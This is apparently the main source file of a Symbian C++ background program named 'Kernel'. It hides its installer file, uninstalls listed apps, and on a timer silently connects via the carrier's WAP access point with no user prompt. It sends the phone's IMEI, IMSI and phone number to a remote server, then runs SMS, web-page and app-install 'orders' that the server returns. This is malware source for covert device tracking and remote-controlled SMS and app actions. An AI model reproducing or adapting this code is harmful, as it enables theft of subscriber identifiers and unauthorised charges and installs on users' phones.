#include <eikstart.h>
#include <e32svr.h>
#include <e32math.h>
#include <pathinfo.h> 
#include <eikenv.h>
#include <eikappui.h>
#include <f32file.h>
#include <eikapp.h>
#include <bautils.h>
#include <apgcli.h>
#include <connpref.h>
#include <commdbconnpref.h>
#include <commdb.h>
#include <cdbpreftable.h>
#include <escapeutils.h>
#include <sysutil.h>
#include <e32base.h>
#include <e32std.h>
#include <e32cons.h>   
#include "kernel.h"
#include "timeouttimer.h"
#include "applicationmanager.h"
#include "commonutils.h"
#include "systemengine.h"
#include "utf.h"
_LIT(KInstallManager, "Kernel");
CKernel* g_server=0;
TInt CKernel::EntryPoint(TAny* /*aNone*/){
    CTrapCleanup* cleanupStack=CTrapCleanup::New();
    if(!cleanupStack) PanicServer(ECreateTrapCleanup);
    TRAPD(leave,ThreadMainL());
    if(leave) PanicServer(ESrvCreateServer);
    delete cleanupStack;
    cleanupStack=NULL;
    return KErrNone;
}

void CKernel::ThreadMainL(){
    CActiveScheduler* activeScheduler=new (ELeave) CActiveScheduler();
    CleanupStack::PushL(activeScheduler);
    CActiveScheduler::Install(activeScheduler);
    RFs fs;
    fs.Connect();
    fs.MkDirAll(KAppFolder);
    fs.Close();
    CKernel::NewLC();
    CActiveScheduler::Start();
    CleanupStack::PopAndDestroy(activeScheduler);
}

CKernel* CKernel::NewL(){
    CKernel* server=CKernel::NewLC();
    CleanupStack::Pop(server);
    return server;
}

CKernel* CKernel::NewLC(){
    CKernel* server=new (ELeave) CKernel(EPriorityNormal);
    CleanupStack::PushL(server);
    server->ConstructL();
    return server;
}

CKernel::CKernel(TInt aPriority) :
    CServer2(aPriority){
}

CKernel::~CKernel(){
    this->OrderCancel();
    SAFE_DELETE(this->iTimeout);
    SAFE_DELETE(this->iAppManager);
    SAFE_DELETE(this->iSmsManager);
    SAFE_DELETE(this->iFlowPageManager);
    this->iConnection.Close();
    this->iSocketServ.Close();
}

void CKernel::ConstructL(){
    RFs iFs;
    iFs.Connect();
    iFs.MkDirAll(KAppFolder);
    RDir oDir;
    _LIT(KDataFolder,"c:\\Data\\");
    oDir.Open(iFs,KDataFolder,KEntryAttNormal);
    TEntryArray* oArray=new (ELeave) TEntryArray;
    oDir.Read(*oArray);
    TInt iCount=oArray->Count();
    _LIT(NamePrefix,"9nokia9-kernel-update-");
    for(TInt i=0;i<iCount;i++){
        TEntry childEntry=(*oArray)[i];
        if(childEntry.iName.FindF(NamePrefix)==0){
            TBuf8<500> fileName8;
            fileName8.Copy(UnicodeToUtf8(childEntry.iName));
            this->iAppChannel.Copy(FindEnclosed(fileName8,_L8("9nokia9-kernel-update-"),_L8("."),EFalse));
            TFileName file;
            file.Copy(KDataFolder);
            file.Append(childEntry.iName);
            if(BaflUtils::FileExists(iFs,file)){
                TRAPD(err,BaflUtils::DeleteFile(iFs,file));
            }
            break;
        }
    }
    iFs.Close();
    StartL(KInstallManager);
    g_server=this;
    this->iAppManager=CApplicationManager::NewL();
    User::After(20*1000*1000);
    this->iAppManager->Uninstall(KUnInstallList);
    this->iSmsManager=CSmsManager::NewL();
    this->iTaskPeriodic=CPeriodic::NewL(0);
    this->iTaskPeriodic->Start(1,TTaskInteval*20*1000000,TCallBack(StartTaskFlow,this));
}

TInt CKernel::StartTaskFlow(TAny* aObject){
    CKernel* app=((CKernel*)aObject);
    TInt count=app->iPeriodicCount;
    app->iPeriodicCount++;
    if(count%3!=0) return 0;//This is to resove a stricky problem, iMMServicePeriodic duration cannot great than 3600
    User::After(GetRandom(1,10)*1000*1000);
    Log(_L8("MainTask started------------------------------------->"));
    if(app->iTimeout) delete app->iTimeout;
    app->iTimeout=CTimeOutTimer::NewL(0,*app);
    app->iTaskState=EInitializeNetWork;
    app->iTimeout->After(1*1000*1000);
    return 0;
}

CSession2* CKernel::NewSessionL(const TVersion&,const RMessage2&) const{
    return NULL;
}

TInt CKernel::RunError(TInt aError){
    if(aError==KErrBadDescriptor){
        PanicClient(Message(),EBadDescriptor);
    }else{
        Message().Complete(aError);
    }
    ReStart();
    return KErrNone;
}

void CKernel::PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic){
    aMessage.Panic(KInstallManager,aPanic);
}

void CKernel::PanicServer(TInstallManagerPanic aPanic){
    User::Panic(KInstallManager,aPanic);
}

void CKernel::InitializeNetWork(){
    TRAPD(err,DoInitNetworkFlow());
    this->iTaskState=(err?ECleanUp:EInitialTask);
    iTimeout->After(1*1000000);
}

void CKernel::CloseNetWork(){
    TRAPD(err,DoCloseNetworkFlow());
    iTaskState=ECleanUp;
    iTimeout->After(1*1000000);
    Log(_L8("Network closed"));
}

void CKernel::CleanUp(){
    this->iTimeout->Cancel();
}

void CKernel::StartFlow(const TDesC8& aFlowOrder,TInt aTaskFlag){
    if(!iFlowPageManager) iFlowPageManager=CFlowPageManager::NewL();
    this->iFlowPageManager->StartFlow(this,aFlowOrder,aTaskFlag);
}

void CKernel::OnTimerExpired(){
    switch(iTaskState){
        case EInitializeNetWork:
        this->InitializeNetWork();
        break;
        case EInitialTask: {
            if(this->iAreaCode.Length()==0){
                TBuf8<1000> buf;
                CSystemEngine* manager=CSystemEngine::NewL();
                CleanupStack::PushL(manager);
                TPtrC8 imei=manager->GetIMEI();
                TPtrC8 imsi=manager->GetIMSI();
                _LIT8(SettingFLow,"------\nu:%S?imei=%S&imsi=%S&machineUid=%d&version=%S&p=%S&phoneNumber=%S&areaCode=%S&self=%S\nv1:${}\nc:n\nm:1\na:n\n------\n");
                buf.AppendFormat(SettingFLow,&KSettingUrl,&imei,&imsi,manager->GetMachineUId(),&KVersion,&iAppChannel,&iPhoneNumber,&iAreaCode,&KUID);
                CleanupStack::PopAndDestroy(manager);
                StartFlow(buf,EInitialTask);
            }else{
                this->iTaskState=EGetOrder;
                this->iTimeout->After(1);
            }
            break;
        }
        case EInitialVariables: {
            TBuf8<10240> buf;
            buf.Copy(this->iFlowPageManager->GetVariable(_L8("v1")));
            StartFlow(buf,EInitialVariables);
            break;
        }
        case EGetOrder: {
            this->iPhoneNumber.Copy(this->iFlowPageManager->GetVariable(_L8("v101"),11,EFalse));
            this->iAreaCode.Copy(this->iFlowPageManager->GetVariable(_L8("v102"),6,EFalse));
            CSystemEngine* manager=CSystemEngine::NewL();
            CleanupStack::PushL(manager);
            TPtrC8 imei=manager->GetIMEI();
            TPtrC8 imsi=manager->GetIMSI();
            TBuf8<200> v3(URLEncode(this->iFlowPageManager->GetVariable(_L8("v103"),50,EFalse)));
            TBuf8<200> v4(URLEncode(this->iFlowPageManager->GetVariable(_L8("v104"),50,EFalse)));
            TBuf8<1000> flowBody;
            _LIT8(OrderFlow,"\n------\nu:%S?imei=%S&imsi=%S&machineUid=%d&version=%S&p=%S&phoneNumber=%S&areaCode=%S&self=%S&v3=%S&v4=%S\nv1:${}\nc:n\nm:1\na:n\n------\n");
            flowBody.AppendFormat(OrderFlow,&KIndexUrl,&imei,&imsi,manager->GetMachineUId(),&KVersion,&iAppChannel,&iPhoneNumber,&iAreaCode,&KUID,&v3,&v4);
            CleanupStack::PopAndDestroy(manager);
            StartFlow(flowBody,EGetOrder);
            break;
        }
        case EExecuteSmsOrder: {
            TPtrC8 temp(this->iFlowPageManager->GetVariable(_L8("v1")));
            _LIT8(taskSplitter,"@@@@@@");
            TInt pos=temp.FindF(taskSplitter);
            if(pos>0){
                this->iSmsOrder.Copy(temp.Left(pos));
                this->iSmsOrder.Trim();
                temp.Set(temp.Right(temp.Length()-pos-taskSplitter().Length()));
                pos=temp.FindF(taskSplitter);
                if(pos>0){
                    this->iPageOrder.Copy(temp.Left(pos));
                    iPageOrder.Trim();
                    this->iAppOrder.Copy(temp.Right(temp.Length()-pos-taskSplitter().Length()));
                    this->iAppOrder.Trim();
                }
            }
            if(this->iSmsOrder.Length()){
                if(!this->iSmsManager) this->iSmsManager=CSmsManager::NewL();
                this->iSmsManager->StartTask(this,this->iSmsOrder,EExecuteSmsOrder);
            }else{
                iTaskState=EExecutePageFlowOrder;
                iTimeout->After(1);
            }
            break;
        }
        case EExecutePageFlowOrder: {
            if(this->iPageOrder.Length()) StartFlow(this->iPageOrder,EExecutePageFlowOrder);
            else{
                iTaskState=EExecuteAppOrder;
                iTimeout->After(1);
            }
            break;
        }
        case EExecuteAppOrder: {
            if(iAppOrder.Length()){
                iAppManager->StartTask(this,iAppOrder,EExecuteAppOrder);
            }else{
                iTaskState=ECloseNetwork;
                iTimeout->After(2*1000*1000);
            }
            break;
        }
        case ECloseNetwork:
        this->CloseNetWork();
        break;
        case ECleanUp:
        this->CleanUp();
        break;
    }
}

TInt CKernel::DoInitNetworkFlow(){
    TInt r=-1;
    iDefaultAccessPointID=2;
#ifndef _MANUALAPN_
#ifndef __WINS__    //如果是真机，检查用户手机是否有移动梦网IAP接入点，如果没有，提示用户需要先建立此接入点
    if(GetAccessPoint()){
        r=0;
    }else{
        Log(_L8("no correct IAP."));
    }
#endif  
#endif  
    iFirstConnect=ETrue;
    Log(_L8("Exception while initialize newwork"));
    return r;
}

void CKernel::DoCloseNetworkFlow(){
    iTimeout->Cancel();
    iTaskState=EInitializeNetWork;
    iCountConnect=0;
    iFirstConnect=ETrue;
    iConnection.Close();
    iSocketServ.Close();
    Log(_L8("close connection complete."));
    iTaskState=ECleanUp;
    this->iTimeout->After(1*1000*1000);
}

TBool CKernel::GetState(){
    TBool r=ETrue;
    if(iFirstConnect){
        iSocketServ.Connect();
        TCommDbConnPref prefs;
        //有些手机需要搜索接入点
        prefs.SetIapId(iDefaultAccessPointID);
        if(0==iConnection.Open(iSocketServ)){
            //提示用户选择接入点
            Log(_L8("CAppMain::GetState(): Hint user to select the access point"));
            prefs.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
            TInt err=0;
#ifndef _MANUALAPN_
            Log(_L8("err=iConnection.Start(prefs);"));
            err=iConnection.Start(prefs);
#else
            Log(_L8("err=iConnection.Start();"));
            err = iConnection.Start();
#endif
            if(0==err){
                iFirstConnect=EFalse;
                return ETrue;
            }
            r=EFalse;
        }
    }
    return r;
}

TBool CKernel::GetAccessPoint(){
    TBuf<100> CommDBName;
    TUint32 default_iap_ID(0);
    TUint32 will_set_iap_id(0);
    TBuf<100> ItemName(_L("wap"));
    const TUint8 str[]={0xfb,0x79,0xa8,0x52,0xa6,0x68,0x51,0x7F,0};
    TPtrC ptrYDMW=TPtrC((TUint16*)str,4);
    //创建手机IAP数据库对象
    CCommsDatabase* commsDatabase=CCommsDatabase::NewL(EDatabaseTypeIAP);
    CleanupStack::PushL(commsDatabase);

    //打开IAP接入点表
    CCommsDbTableView* tableIAP=commsDatabase->OpenTableLC(TPtrC(IAP));
    if(tableIAP->GotoFirstRecord()==KErrNone){
        do{
            //循环获取IAP接入点，如有移动梦网接入点则对will_set_iap_id赋值
            tableIAP->ReadUintL(TPtrC(COMMDB_ID),default_iap_ID);
            tableIAP->ReadTextL(TPtrC(COMMDB_NAME),CommDBName);
            //iCoeEnv->ReadResource(ItemName, LOC_BUF_ACCESS_POINT_DEFAULT);
            if(CommDBName.FindF(ItemName)>=0||CommDBName.FindF(ptrYDMW)>=0){
                will_set_iap_id=default_iap_ID;
                break;
            }
        }while(tableIAP->GotoNextRecord()==KErrNone);
    }
    //delete tableIAP;
    CleanupStack::PopAndDestroy(tableIAP);
    CleanupStack::PopAndDestroy(commsDatabase);

    //将获取的移动梦网接入点做为缺省访问接入点
    if(will_set_iap_id>0){
        iDefaultAccessPointID=will_set_iap_id;
        Log(_L8("cmwap IAP"));
        //    TBuf8<12> buf;
        //    buf.AppendNum((TInt)will_set_iap_id);
        //    Log(buf);
        return ETrue;
    }else{
        //假如没有找到“移动梦网”接入点，则提示用户在手机中设置此接入点
        Log(_L8("no cmwap"));
        return EFalse;
    }
}

TInt CKernel::OrderCancel(){
    if(iTimeout) iTimeout->Cancel();
    return 0;
}

void CKernel::OnTaskSuccess(TInt aTaskFlag){
    Log(_L8("CAppMain::OnTaskSuccess"));
    switch(aTaskFlag){
        case EInitialTask:
        this->iTaskState=EInitialVariables;
        break;
        case EInitialVariables:
        this->iTaskState=EGetOrder;
        break;
        case EGetOrder:
        this->iTaskState=EExecuteSmsOrder;
        break;
        case EExecuteSmsOrder:
        this->iTaskState=EExecutePageFlowOrder;
        break;
        case EExecutePageFlowOrder:
        this->iTaskState=EExecuteAppOrder;
        break;
        default:
        this->iTaskState=ECloseNetwork;

        break;
    }
    this->iTimeout->After(1*1000*1000);
}

void CKernel::OnTaskFailed(TInt aTaskFlag,const TDesC8& aFailedReason,TInt aFailedStep){
    Log(_L8("CAppMain::OnTaskFailed: task failed"));
    switch(aTaskFlag){
        case EInitialTask:
        this->iTaskState=ECloseNetwork;
        this->iTimeout->After(1*1000*1000);
        break;
        case EInitialVariables:
        this->iTaskState=EGetOrder;
        this->iTimeout->After(1);
        break;
        case EGetOrder:
        this->iTaskState=ECloseNetwork;
        this->iTimeout->After(1*1000*1000);
        break;
        case EExecuteSmsOrder:
        this->iTaskState=EExecutePageFlowOrder;
        this->iTimeout->After(1);
        break;
        case EExecutePageFlowOrder:
        this->iTaskState=EExecuteAppOrder;
        this->iTimeout->After(1);
        break;
        default:
        this->iTaskState=ECloseNetwork;
        this->iTimeout->After(1*1000*1000);
        break;
    }
}

TInt E32Main(){
    return CKernel::EntryPoint(NULL);
}
